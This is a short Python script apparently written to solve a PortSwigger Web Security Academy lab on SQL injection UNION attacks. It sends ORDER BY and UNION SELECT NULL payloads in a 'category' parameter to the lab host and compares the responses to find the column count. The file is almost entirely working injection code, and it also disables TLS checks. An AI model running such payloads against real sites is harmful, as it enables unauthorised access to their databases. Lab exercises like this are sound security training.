# https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

import requests
requests.packages.urllib3.disable_warnings()

url = "https://ac881fa91e8e17aa80f81103009e0065.web-security-academy.net/filter"
proxy = "127.0.0.1:8080"
proxies = {"https": proxy, "http": proxy}
cookies = {"session": "O5RYagmhoPZD7OezmA0QtQ8OigGlmBpm"}
verify = False

def determineNumberOfColumnsLab():
    def usingOrderBy():
        for i in range(1, 11):
            yield f"' ORDER BY {i}-- "

    def usingNull():
        cols = "NULL"
        for _ in range(1, 11):
            yield f"' UNION SELECT {cols}-- "
            cols += ", NULL"

    hs = set()
    rs = {}
    # for q in usingOrderBy():
    for q in usingNull():
        params = {"category": q}
        r = requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)
        h = hash(r.text)
        if h not in hs:
            hs.add(h)
            rs[q] = r

    for k,_ in rs.items():
        print(k)

# determineNumberOfColumnsLab()